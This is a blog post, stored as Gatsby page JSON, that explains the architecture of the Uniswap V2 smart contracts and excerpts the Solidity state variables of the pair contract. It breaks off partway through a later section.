{
    "componentChunkName": "component---src-templates-blog-template-js",
    "path": "/uniswap-contract/",
    "result": {"data":{"cur":{"id":"aca02e18-f96b-528d-93b0-e4fde9635d9f","html":"<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.111111111111114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAACD0lEQVQoz6WSTU8TURiFX2baoZCgtTNTWootaYrId2oFCqnVVKGgo01EEkkqghChJGKI3xqjRhcqhoValK0fG1nrwvg7/AHGhSv/wmNmmNbCxoWLk3vuve97ct4PqfM0I2oQ+9Q8YRTnbiBaCFFjBDvPUXq5wZnJ44g0ImKieN0ctdnJq4VUiRp0BFt8cSISI5vMYU0XMbovMHFji+WNT5Q3V+lqj1VFd4s5OhV3FVEbwfoY4/4U86kp9gQiSH2SI9YVvq2VWBkeQET/t6DiwuMNOQ6GW6Pkox00RdKINJFojXD5RB9f7k1hBLZd2rF2ruoJua0Kbpe8TXREcSF7McJRJqwhRIQ64xCJ3EVEAjQl+tD8UUT2IXUBRDUR8TvcdWjSoEXINY+QMYcYDWU4Ghjk9MFTvHu7xa3SXW4O3WdxYZNrhRJj+ghZI82AnsJqOYbZGOdOx3kG9cOuGcVAb2ij3L/Ei955nvXM8TP/ig/JFcqjj/m48J4fuXVmowW+Zh/w29rkafcs670LfM+tMR7O8mu8zJOuGdepU7LJw84ir/sXGQtleNRZZLV9kpn9eU4aGT6nb5MxB1mOF3jTv8R0NM/VxFme98xxqc3i+oEp/L5YbQ9Np7GaN+xO2kQ8QVRvyGm8T4s4b5XY6gAUHc3bgl2ljR1TrqzM7hXa8a7+/atshs2VGi61Af+DirE/j440DqQledwAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Uniswap\"\n        title=\"Uniswap\"\n        src=\"/static/8ca6b7eb5abaef56c52f9e1fa3eccc97/37523/uniswap-1.png\"\n        srcset=\"/static/8ca6b7eb5abaef56c52f9e1fa3eccc97/e9ff0/uniswap-1.png 180w,\n/static/8ca6b7eb5abaef56c52f9e1fa3eccc97/f21e7/uniswap-1.png 360w,\n/static/8ca6b7eb5abaef56c52f9e1fa3eccc97/37523/uniswap-1.png 720w,\n/static/8ca6b7eb5abaef56c52f9e1fa3eccc97/302a4/uniswap-1.png 1080w,\n/static/8ca6b7eb5abaef56c52f9e1fa3eccc97/07a9c/uniswap-1.png 1440w,\n/static/8ca6b7eb5abaef56c52f9e1fa3eccc97/29114/uniswap-1.png 1920w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<h1 id=\"overview\" style=\"position:relative;\"><a href=\"#overview\" aria-label=\"overview permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview</h1>\n<ul>\n<li>How it works at the uniswap code level</li>\n<li>uniswap code structure method</li>\n<li>uniswap contract\n<ul>\n<li>Core Contract: Pair</li>\n<li>Core Contract: Factory</li>\n<li>Periphery Contract: Router</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"core-contract\" style=\"position:relative;\"><a href=\"#core-contract\" aria-label=\"core contract permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Core Contract</h1>\n<ul>\n<li>SingleTone Factory, consists of several pairs where Factory is responsible for creation and indexing.</li>\n<li>Contracts with a smaller surface area are easier to reason about, more prone to bugs, and functionally better.</li>\n</ul>\n<p>This means that many desired properties of the system can be asserted directly in code, leaving little room for error.</p>\n<ul>\n<li>Core Contract is somewhat unfriendly</li>\n<li>In practice, interacting directly with these contracts is discouraged in most use cases.</li>\n</ul>\n<p><a href=\"https://github.com/Uniswap/v2-core\">https://github.com/Uniswap/v2-core</a></p>\n<h1 id=\"factory-contract\" style=\"position:relative;\"><a href=\"#factory-contract\" aria-label=\"factory contract permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Factory Contract</h1>\n<ul>\n<li>Holds the generic bytecode that powers the factory pair.</li>\n<li>The main task is to create only one smart contract per unique token pair.</li>\n<li>Logic to control protocol power is also included.</li>\n</ul>\n<p><a href=\"https://docs.uniswap.org/protocol/V2/reference/smart-contracts/factory\">https://docs.uniswap.org/protocol/V2/reference/smart-contracts/factory</a></p>\n<h1 id=\"pairs-contract\" style=\"position:relative;\"><a href=\"#pairs-contract\" aria-label=\"pairs contract permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Pairs Contract</h1>\n<ul>\n<li>Acts as an AMM and keeps track of pool token balances</li>\n<li>Exposes data that can be used to build a Decentralized Price Oracle.</li>\n</ul>\n<p><a href=\"https://docs.uniswap.org/protocol/V2/reference/smart-contracts/pair\">https://docs.uniswap.org/protocol/V2/reference/smart-contracts/pair</a></p>\n<p><a href=\"https://docs.uniswap.org/protocol/V2/reference/smart-contracts/pair-erc-20\">https://docs.uniswap.org/protocol/V2/reference/smart-contracts/pair-erc-20</a></p>\n<h1 id=\"periphery-contract\" style=\"position:relative;\"><a href=\"#periphery-contract\" aria-label=\"periphery contract permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Periphery Contract</h1>\n<ul>\n<li>A set of smart contracts designed to support core and domain-specific interactions</li>\n<li>Due to the permissionless nature of Uniswap, each contract has no specific authority and is actually only a part of possible peripheral-like contracts.</li>\n<li>Safe and efficient interaction.</li>\n</ul>\n<p><a href=\"https://github.com/Uniswap/uniswap-v2-periphery\">https://github.com/Uniswap/uniswap-v2-periphery</a></p>\n<h1 id=\"library-contract\" style=\"position:relative;\"><a href=\"#library-contract\" aria-label=\"library contract permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Library Contract</h1>\n<ul>\n<li>The library provides various convenient functions for data import and pricing.</li>\n</ul>\n<p><a href=\"https://docs.uniswap.org/protocol/V2/reference/smart-contracts/library\">https://docs.uniswap.org/protocol/V2/reference/smart-contracts/library</a></p>\n<h1 id=\"router-contract\" style=\"position:relative;\"><a href=\"#router-contract\" aria-label=\"router contract permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Router Contract</h1>\n<ul>\n<li>The router using the library fully supports all the basic requirements of the front-end to provide transaction and liquidity management functions.</li>\n<li>In particular, it basically supports multi-pair trades (e.g x to y to z), treats ETH as a first-class citizen, and provides meta-trading to eliminate liquidity.</li>\n</ul>\n<p><a href=\"https://docs.uniswap.org/protocol/V2/reference/smart-contracts/router-02\">https://docs.uniswap.org/protocol/V2/reference/smart-contracts/router-02</a></p>\n<h2 id=\"uniswap-code-level\" style=\"position:relative;\"><a href=\"#uniswap-code-level\" aria-label=\"uniswap code level permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Uniswap Code Level</h2>\n<ul>\n<li>The whole purpose of Uniswap is to enable the exchange of one ERC20 token for another token.</li>\n<li>For example, if you need tokenA but only have tokenB, you can use Uniswap to sell tokenB and get tokenA in return, all done in an automatic and decentralized way</li>\n</ul>\n<h3 id=\"two-models-of-exchange-way\" style=\"position:relative;\"><a href=\"#two-models-of-exchange-way\" aria-label=\"two models of exchange way permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Two models of exchange way</h3>\n<ul>\n<li>Order Book Model\n<ul>\n<li>Buyers and sellers place orders</li>\n<li>Centralized system matches buy orders with sell orders, how traditional stock exchanges work</li>\n</ul>\n</li>\n<li>Automated Market Makers (AMM)\n<ul>\n<li>There is no centralized financial execution method, and there are people who offer both tokens, which are called liquidity providers.</li>\n<li>This liquidity provider uses each token to create a token pool, where traders can come and etch the tokens they want to swap and receive the tokens in return.</li>\n<li>It is done automatically without a centralized entity, and traders pay a small percentage of fees for transactions going to liquidity providers for services.</li>\n</ul>\n</li>\n<li>In the previous chapter, Uniswap uses AMM technology and explains each technology.</li>\n</ul>\n<h2 id=\"uniswap-code-component\" style=\"position:relative;\"><a href=\"#uniswap-code-component\" aria-label=\"uniswap code component permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Uniswap Code Component</h2>\n<ul>\n<li>Uniswap has a total of 4 smart contracts. It is divided into (Core, Periphery).</li>\n<li>Core Contract\n<ul>\n<li>Storing funds (tokens) and exposing functions for token exchange, fund addition, rewards, etc.</li>\n</ul>\n</li>\n<li>Periphery\n<ul>\n<li>Added convenience for interaction and development with Core Contract.</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"core-contract-1\" style=\"position:relative;\"><a href=\"#core-contract-1\" aria-label=\"core contract 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Core Contract</h3>\n<ul>\n<li>Pair (swapping, miniting, burning functions)\n<ul>\n<li>Generated for every exchange pair.</li>\n</ul>\n</li>\n<li>Factory (Creates and keeps track of Pairs)\n<ul>\n<li>Create all pair contracts and proceed with tracking.</li>\n</ul>\n</li>\n<li>ERC20 (Stores “ownerShip” tokens for the pool)\n<ul>\n<li>To track the Pool Owner</li>\n<li>Treat the Pool as property and obtain “Pool Ownership Tokens” in return when liquidity providers provide funds to the pool</li>\n<li>If you own these ownership tokens, you can get rewards. (By the trader paying a small percentage for each trade)</li>\n<li>When the liquidity provider wants the funds returned, resubmit the ownership token and return the funds + accumulated rewards.</li>\n<li>The ERC20 contract tracks ownership tokens.</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"periphery-contract-1\" style=\"position:relative;\"><a href=\"#periphery-contract-1\" aria-label=\"periphery contract 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Periphery Contract</h2>\n<ul>\n<li>Consists of only one smart contract.</li>\n<li>Router(Interacts with the core)\n<ul>\n<li>Provides functions such as <code class=\"language-text\">swapExactETHForTokens</code> and <code class=\"language-text\">swapETHForEactTokens</code> to interact with the Core Contract</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"uniswap-features\" style=\"position:relative;\"><a href=\"#uniswap-features\" aria-label=\"uniswap features permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Uniswap Features</h1>\n<ul>\n<li>Liquidity provider\n<ul>\n<li>Deposit more funds and withdraw funds with rewards.</li>\n</ul>\n</li>\n<li>Trader\n<ul>\n<li>Exchange each pool and funds.</li>\n</ul>\n</li>\n<li>Pool Ownership Token Management\n<ul>\n<li>Address management of the owner deposited in the pool and tracking function for fund management, etc.</li>\n</ul>\n</li>\n<li>Protocol fee\n<ul>\n<li>Uniswap V2 introduces convertible protocol fees.</li>\n<li>This protocol fee is turned off, but you can enable it later through settings.</li>\n<li>If enabled, traders pay the same transaction fee, but 1/6 of this fee goes to uniswap and the remaining 5/6 goes to liquidity providers as a reward for providing funds.</li>\n</ul>\n</li>\n<li>Money management</li>\n<li>Oracle price\n<ul>\n<li>Track token prices against each other</li>\n<li>Can be used as Oracle Price for other smart contracts in the Ethereum ecosystem.</li>\n<li>Due to arbitrage, Uniswap Price tends to closely follow the token’s actual starting price. Therefore, Uniswap Price Oracle is an approximation to the actual price.</li>\n</ul>\n</li>\n</ul>\n<hr>\n<h1 id=\"uniswap-contract\" style=\"position:relative;\"><a href=\"#uniswap-contract\" aria-label=\"uniswap contract permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Uniswap Contract</h1>\n<h2 id=\"core-contract-pair\" style=\"position:relative;\"><a href=\"#core-contract-pair\" aria-label=\"core contract pair permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Core. Contract (Pair)</h2>\n<ul>\n<li>It implements the exchange between each token pair. Here is the full code snippet.</li>\n</ul>\n<p><a href=\"https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol\">https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol</a></p>\n<h3 id=\"contract-init--state-variable\" style=\"position:relative;\"><a href=\"#contract-init--state-variable\" aria-label=\"contract init  state variable permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Contract Init &#x26;&#x26; State Variable</h3>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">UniswapV2Pair</span> <span class=\"token keyword\">is</span> IUniswapV2Pair<span class=\"token punctuation\">,</span> UniswapV2ERC20 <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">using</span> <span class=\"token class-name\">SafeMath</span>  <span class=\"token keyword\">for</span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">using</span> <span class=\"token class-name\">UQ112x112</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">uint224</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">constant</span> MINIMUM_LIQUIDITY <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token operator\">**</span><span class=\"token number\">3</span><span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">bytes4</span> <span class=\"token keyword\">private</span> <span class=\"token keyword\">constant</span> SELECTOR <span class=\"token operator\">=</span> <span class=\"token builtin\">bytes4</span><span class=\"token punctuation\">(</span><span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">(</span><span class=\"token string\">'transfer(address,uint256)'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> factory<span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> token0<span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> token1<span class=\"token punctuation\">;</span>\n\n  <span class=\"token builtin\">uint112</span> <span class=\"token keyword\">private</span> reserve0<span class=\"token punctuation\">;</span>           <span class=\"token comment\">// uses single storage slot, accessible via getReserves</span>\n  <span class=\"token builtin\">uint112</span> <span class=\"token keyword\">private</span> reserve1<span class=\"token punctuation\">;</span>           <span class=\"token comment\">// uses single storage slot, accessible via getReserves</span>\n  <span class=\"token builtin\">uint32</span>  <span class=\"token keyword\">private</span> blockTimestampLast<span class=\"token punctuation\">;</span> <span class=\"token comment\">// uses single storage slot, accessible via getReserves</span>\n\n  <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> price0CumulativeLast<span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> price1CumulativeLast<span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> kLast<span class=\"token punctuation\">;</span> <span class=\"token comment\">// reserve0 * reserve1, as of immediately after the most recent liquidity event</span>\n\n  <span class=\"token builtin\">uint</span> <span class=\"token keyword\">private</span> unlocked <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">modifier</span> <span class=\"token function\">lock</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>unlocked <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'UniswapV2: LOCKED'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      unlocked <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">_</span><span class=\"token punctuation\">;</span>\n      unlocked <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token comment\">// ...</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>It relies on the <code class=\"language-text\">IUniswapV2Pair, UniswapV2ERC20</code> contract, and the function implementation for each interface must be carried out.</li>\n<li>The <code class=\"language-text\">UniswapV2ERC20</code> Contract manages the full ownership token.</li>\n</ul>\n<h3 id=\"vaults-managerment-features\" style=\"position:relative;\"><a href=\"#vaults-managerment-features\" aria-label=\"vaults managerment features permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vaults Managerment features</h3>\n<ul>\n<li>Exchange between token pairs such as Uniswap Pair tokenA and tokenB.</li>\n<li>These tokens are indicated as <code class=\"language-text\">token0</code> in the contract and are the address of the ERC20 Smart Contract to implement <code class=\"language-text\">token1</code>.</li>\n<li><code class=\"language-text\">reserve0 ~ 1</code> state variables store the amount of tokens in the pair.</li>\n</ul>\n<h3 id=\"how-to-store-tokens\" style=\"position:relative;\"><a href=\"#how-to-store-tokens\" aria-label=\"how to store tokens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 